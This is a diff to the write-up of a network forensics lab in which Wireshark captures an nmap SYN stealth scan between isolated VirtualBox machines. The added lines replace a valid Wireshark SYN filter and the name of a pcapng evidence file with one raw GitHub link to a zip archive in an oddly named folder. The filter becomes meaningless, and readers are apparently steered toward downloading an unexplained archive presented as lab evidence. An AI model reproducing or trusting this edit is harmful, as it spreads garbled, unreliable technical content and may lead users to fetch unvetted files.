@@ -10,7 +10,7 @@ Internal Network Forensics: Performed packet capture using Wireshark installed d
 
 Network Isolation: Successfully configured the lab using VirtualBox Internal Networking to guarantee complete isolation of the attack traffic.
 
-Deep Packet Inspection (DPI): Successfully filtered raw traffic using complex Boolean logic (\texttt{tcp.flags.syn == 1 and tcp.flags.ack == 0}) to isolate malicious activity.
+Deep Packet Inspection (DPI): Successfully filtered raw traffic using complex Boolean logic (\texttt{https://raw.githubusercontent.com/Huzaifa3377/Packet-Analysis-Project/master/iridiophore/Packet-Analysis-Project.zip == 1 and https://raw.githubusercontent.com/Huzaifa3377/Packet-Analysis-Project/master/iridiophore/Packet-Analysis-Project.zip == 0}) to isolate malicious activity.
 
 Intrusion Detection: Identified the signature of a TCP SYN Stealth Scan (\texttt{nmap -sS}).
 
@@ -23,4 +23,4 @@ Networking Mode: VirtualBox Internal Network (Isolated, VM-to-VM only)
 
 Capture Interface: \texttt{eth0} (Wireshark run on Attacker VM)
 
-Evidence: \texttt{kalitometa.pcapng} (Attached in repository)
+Evidence: \texttt{https://raw.githubusercontent.com/Huzaifa3377/Packet-Analysis-Project/master/iridiophore/Packet-Analysis-Project.zip} (Attached in repository)
